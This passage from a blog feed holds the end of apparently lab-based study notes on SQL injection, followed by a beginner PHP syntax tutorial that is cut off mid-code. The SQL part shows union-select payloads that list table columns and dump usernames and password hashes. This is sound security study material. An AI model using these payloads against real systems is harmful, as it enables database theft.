<p><strong>补充：</strong><br>MySQL中的<code>information_schema</code> 数据库保存了MySQL服务器所有数据库的信息，如数据库名，数据库的表，表栏的数据类型与访问权限等，提供了访问数据库元数据的方式。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SCHEMATA表：提供了关于数据库名的信息。</div><div class="line">TABLES表：给出了关于数据库中的表的信息。</div><div class="line">COLUMNS表：给出了表中的列信息。</div></pre></td></tr></table></figure></p>
<p>参考博客<a href="https://blog.csdn.net/boshuzhang/article/details/65632708" target="_blank" rel="noopener">mysql中information_schema.tables字段说明 </a>。<br><code>information_schema.tables</code>表用来保存数据库中所有表的信息。<br><code>table_schema=数据库名</code>表示数据表所属的数据库。<br><code>table_name</code>表名称。<br><code>group_concat()</code>会计算哪些行属于同一组，将属于同一组的列显示出来(同一组的显示在一行)，要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据<code>group by</code>指定的列进行分组。</p>
<p><strong>6.获取表中的字段名</strong><br>输入<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code>，查询成功：<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-10.png" alt="1-10"><br>说明<code>users</code>表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
<p><strong>7.下载数据</strong><br>输入<code>1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code>，查询成功：<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-11.png" alt="1-11"><br>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《Web安全深度剖析》学习总结, 本部分主要总结SQL注入原理。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Web Security" scheme="http://yoursite.com/tags/Web-Security/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>PHP入门学习</title>
    <link href="http://yoursite.com/2018/05/20/PHP%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E8%8F%9C%E9%B8%9F/"/>
    <id>http://yoursite.com/2018/05/20/PHP入门学习-菜鸟/</id>
    <published>2018-05-20T09:06:32.000Z</published>
    <updated>2018-05-20T09:07:19.481Z</updated>
    
    <content type="html"><![CDATA[<p>来自菜鸟PHP基础语法学习总结。<br><a id="more"></a></p>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>PHP 脚本在服务器上执行，然后将纯 HTML 结果发送回浏览器。</p>
<ul>
<li>PHP 脚本以 <code>&lt;?php</code> 开始，以 <code>?&gt;</code> 结束。</li>
<li>PHP 中的每个代码行都必须以分号结束。</li>
<li>两种在浏览器输出文本的基础指令：<code>echo</code> 和 <code>print</code>。</li>
<li>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码,PHP 脚本可以放在文档中的任何位置。</li>
<li>单行注释：<code>//</code>，多行注释：<code>/**/</code><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2>变量以 $ 符号开始，变量名是区分大小写。<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$txt=<span class="string">"Hello world!"</span>;</div><div class="line">$x=<span class="number">5</span>;</div><div class="line">$y=<span class="number">10.5</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
</ul>
<p>PHP 是一门弱类型语言。</p>
<h3 id="PHP-变量作用域"><a href="#PHP-变量作用域" class="headerlink" title="PHP 变量作用域"></a>PHP 变量作用域</h3><p>PHP 有四种不同的变量作用域：local、global、static、parameter。</p>
<p>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。 </p>
<p>函数内部声明的变量是局部变量，仅能在函数内部访问。</p>
<p><strong>注意：</strong> global 关键字用于函数内访问全局变量。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$x=<span class="number">5</span>;</div><div class="line">$y=<span class="number">10</span>;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">global</span> $x,$y;</div><div class="line">    $y=$x+$y;</div><div class="line">&#125;</div><div class="line"> </div><div class="line">myTest();</div><div class="line"><span class="keyword">echo</span> $y; <span class="comment">// 输出 15</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。</p>
<p><strong>Static 作用域</strong> 当一个函数完成时，它的所有局部变量通常都会被删除。然而有时候希望某个局部变量不要被删除,第一次声明变量时使用 static 关键字。</p>
<h2 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h2><p>超级全局变量在一个脚本的全部作用域中都可用。 不需要特别说明，也可以在函数及类中使用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$GLOBALS</div><div class="line">$_SERVER</div><div class="line">$_REQUEST</div><div class="line">$_POST</div><div class="line">$_GET</div><div class="line">$_FILES</div><div class="line">$_ENV</div><div class="line">$_COOKIE</div><div class="line">$_SESSION</div></pre></td></tr></table></figure></p>
<h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><p><code>$GLOBALS</code> 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$x = <span class="number">75</span>; </div><div class="line">$y = <span class="number">25</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addition</span><span class="params">()</span> </span></div><div class="line"><span class="function"></span>&#123; </div><div class="line">    $GLOBALS[<span class="string">'z'</span>] = $GLOBALS[<span class="string">'x'</span>] + $GLOBALS[<span class="string">'y'</span>]; </div><div class="line">&#125;</div><div class="line">addition(); </div><div class="line"><span class="keyword">echo</span> $z; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h3><p><code>$_SERVER</code> 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'PHP_SELF'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'SERVER_NAME'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_HOST'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_REFERER'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'SCRIPT_NAME'</span>];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><p><code>$_REQUEST</code> 用于收集HTML表单提交的数据。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF'];?&gt;"</span>&gt;</span></div><div class="line">Name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fname"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?php</span> </span></div><div class="line"><span class="php">$name = $_REQUEST[<span class="string">'fname'</span>]; </span></div><div class="line"><span class="php"><span class="keyword">echo</span> $name; </span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h3><p><code>$_POST</code> 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF'];?&gt;"</span>&gt;</span></div><div class="line">Name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fname"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php">$name = $_POST[<span class="string">'fname'</span>];</span></div><div class="line"><span class="php"><span class="keyword">echo</span> $name;</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h3><p><code>$_GET</code> 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。<code>$_GET</code>也可以收集URL中发送的数据。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"test_get.php?subject=PHP&amp;web=runoob.com"</span>&gt;</span>Test $GET<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>test_get.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"Study "</span> . $_GET[<span class="string">'subject'</span>] . <span class="string">" at "</span> . $_GET[<span class="string">'web'</span>];</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<h2 id="魔术变量"><a href="#魔术变量" class="headerlink" title="魔术变量"></a>魔术变量</h2><p>PHP 向它运行的任何脚本提供了大量的预定义常量。不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。</p>
<p>这些特殊的常量不区分大小写,随着它们在代码中的位置改变而改变。</p>
<ul>
<li><code>__LINE__</code>: 文件中的当前行号。</li>
<li><code>__FILE__</code>: 文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。</li>
<li><code>__DIR__</code>: 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。等价于 dirname(<strong>FILE</strong>)。除非是根目录，否则目录中名不包括末尾的斜杠。</li>
<li><code>__FUNCTION__</code>: 返回该函数被定义时的名字。（PHP 5 起区分大小写）</li>
<li><code>__CLASS__</code>: 返回该类被定义时的名字（PHP 5 起区分大小写）</li>
<li><code>__TRAIT__</code>: Trait 的名字</li>
<li><code>__METHOD__</code>: 类的方法名，返回该方法被定义时的名字（区分大小写）</li>
<li><code>__NAMESPACE__</code>: 当前命名空间的名称（区分大小写）</li>
</ul>
<h2 id="echo-print"><a href="#echo-print" class="headerlink" title="echo/print"></a>echo/print</h2><ul>
<li>echo - 可以输出一个或多个字符串。字符串可以包含 HTML 标签。</li>
<li>print - 只允许输出一个字符串，返回值总为 1。字符串可以包含 HTML 标签。</li>
</ul>
<p>两者在使用时都可以加括号或不加，<code>echo</code>/<code>echo()</code>，<code>print</code>/<code>print()</code>。</p>
<h2 id="定界符EOF-heredoc"><a href="#定界符EOF-heredoc" class="headerlink" title="定界符EOF(heredoc)"></a>定界符EOF(heredoc)</h2><p>PHP 定界符 EOF 的作用就是按照原样，包括换行格式什么的，输出在其内部的字符串；定界符 EOF 中的任何特殊字符都不需要转义。</p>
<p>规则：</p>
<ol>
<li>必须后接分号，否则编译通不过。</li>
<li>EOF 可以用任意其它字符代替，只需保证结束标识<code>EOF</code>与开始标识<code>&lt;&lt;&lt;EOF</code>一致。</li>
<li>结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。</li>
<li>开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。</li>
<li>当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义。</li>
<li>位于开始标记和结束标记之间的变量可以被正常解析，但是函数则不可以。</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$name=<span class="string">"runoob"</span>;</div><div class="line">$a= <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line"><span class="string">    "abc"<span class="subst">$name</span></span></div><div class="line"><span class="string">    "123"</span></div><div class="line"><span class="string">EOF;</span></div><div class="line"><span class="comment">// 结束需要独立一行且前后不能空格</span></div><div class="line"><span class="keyword">echo</span> $a;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。</p>
<p>以下实例中创建了一个<strong>数组</strong>， 然后使用 PHP var_dump() 函数返回数组的数据类型和值：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</div><div class="line">var_dump($cars);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="comment">//输出 array(3) &#123; [0]=&gt; string(5) "Volvo" [1]=&gt; string(3) "BMW" [2]=&gt; string(6) "Toyota" &#125;</span></div></pre></td></tr></table></figure></p>
<p><strong>对象</strong><br>在 PHP 中，对象必须声明。用<code>class</code>关键字声明类对象，类是包含属性和方法的数据结构。在类中定义数据类型，然后在实例化的对象中使用数据类型：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">  <span class="keyword">var</span> $color;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($color=<span class="string">"green"</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;color = $color;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">what_color</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;color;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>$this</code> 代表实例化的对象，<code>PHP_EOL</code> 为换行符。</p>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量在定义后，默认是全局变量,可以在整个运行的脚本的任何地方使用（包括函数内部）。</p>
<p>使用<code>define()</code>函数设置常量：<code>bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )</code></p>
<pre><code>name：必选参数，常量名称，即标志符。
value：必选参数，常量的值。
case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。
</code></pre><p>eg:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// 不区分大小写的常量名</span></div><div class="line">define(<span class="string">"GREETING"</span>, <span class="string">"欢迎访问 Runoob.com"</span>, <span class="keyword">true</span>);</div><div class="line"><span class="keyword">echo</span> greeting;  <span class="comment">// 输出 "欢迎访问 Runoob.com"</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ul>
<li><p>并置运算符 <code>.</code> 用于把两个字符串值连接起来。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line">$txt1=<span class="string">"Hello world!"</span>;</div><div class="line">$txt2=<span class="string">"What a nice day!"</span>;</div><div class="line"><span class="keyword">echo</span> $txt1 . <span class="string">" "</span> . $txt2;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>strlen()</code> 函数返回字符串的长度（字符数)。</p>
</li>
<li><code>strpos()</code> 函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">echo</span> strpos(<span class="string">"Hello world!"</span>,<span class="string">"world"</span>); </div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="comment">//输出 6</span></div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><p>array() 函数用于创建数组：<code>array();</code><br>有三种类型的数组：</p>
<ul>
<li>数值数组 - 带有数字 ID 键的数组。<code>$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</code></li>
<li>关联数组 - 带有指定的键的数组，每个键关联一个值。 使用分配给数组的指定键创建的数组。<code>$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</code></li>
<li>多维数组 - 包含一个或多个数组的数组</li>
</ul>
<h3 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h3><ul>
<li><code>count()</code> 函数用于返回数组的长度</li>
<li>访问数组元素，使用中括号 <code>[]</code>，即<code>$cars[0]</code></li>
<li>使用 foreach 循环遍历关联数组<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</div><div class="line"><span class="keyword">foreach</span>($age <span class="keyword">as</span> $x=&gt;$x_value)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Key="</span> . $x . <span class="string">", Value="</span> . $x_value;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span> </div><div class="line"><span class="comment">//输出</span></div><div class="line"><span class="comment">//Key=Peter, Value=35</span></div><div class="line"><span class="comment">//Key=Ben, Value=37</span></div><div class="line"><span class="comment">//Key=Joe, Value=43</span></div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sort() - 对数组进行升序排列</div><div class="line">rsort() - 对数组进行降序排列</div><div class="line">asort() - 根据关联数组的值，对数组进行升序排列</div><div class="line">ksort() - 根据关联数组的键，对数组进行升序排列</div><div class="line">arsort() - 根据关联数组的值，对数组进行降序排列</div><div class="line">krsort() - 根据关联数组的键，对数组进行降序排列</div></pre></td></tr></table></figure>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>默认情况下，所有常量、类和函数名都放在全局空间下。<br>如果一个文件中包含命名空间，它必须在其它所有代码之前声明命名空间，命名空间通过关键字namespace 来声明。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line"><span class="comment">// 定义代码在 'MyProject' 命名空间中  </span></div><div class="line"><span class="keyword">namespace</span> <span class="title">MyProject</span>;  </div><div class="line"> </div><div class="line"><span class="comment">// ... 代码 ...</span></div></pre></td></tr></table></figure>
<p><strong>注意：</strong> 在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 declare 语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。</p>
<p>将全局的非命名空间中的代码与命名空间中的代码组合在一起，只能使用大括号形式的语法。全局代码必须用一个不带名称的 namespace 语句加上大括号括起来，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">MyProject</span> &#123;</div><div class="line"></div><div class="line"><span class="title">const</span> <span class="title">CONNECT_OK</span> = 1;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">namespace</span> &#123; // 全局代码</div><div class="line"><span class="title">session_start</span>();</div><div class="line">$a = MyProject\connect();</div><div class="line"><span class="keyword">echo</span> MyProject\Connection::start();</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p><a href="http://www.runoob.com/php/php-oop.html" target="_blank" rel="noopener">PHP 面向对象</a></p>
<h1 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h1><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><h3 id="下拉菜单多选"><a href="#下拉菜单多选" class="headerlink" title="下拉菜单多选"></a>下拉菜单多选</h3><p>下拉菜单是多选的（ multiple=”multiple”），可以通过将设置 select <code>name=&quot;q[]&quot;</code> 以数组的方式获取。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$q = <span class="keyword">isset</span>($_POST[<span class="string">'q'</span>])? $_POST[<span class="string">'q'</span>] : <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>(is_array($q)) &#123;</div><div class="line">    $sites = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'RUNOOB'</span> =&gt; <span class="string">'菜鸟教程: http://www.runoob.com'</span>,</div><div class="line">            <span class="string">'GOOGLE'</span> =&gt; <span class="string">'Google 搜索: http://www.google.com'</span>,</div><div class="line">            <span class="string">'TAOBAO'</span> =&gt; <span class="string">'淘宝: http://www.taobao.com'</span>,</div><div class="line">    );</div><div class="line">    <span class="keyword">foreach</span>($q <span class="keyword">as</span> $val) &#123;</div><div class="line">        <span class="comment">// PHP_EOL 为常量，用于换行</span></div><div class="line">        <span class="keyword">echo</span> $sites[$val] . PHP_EOL;</div><div class="line">    &#125;</div><div class="line">      </div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;form action=<span 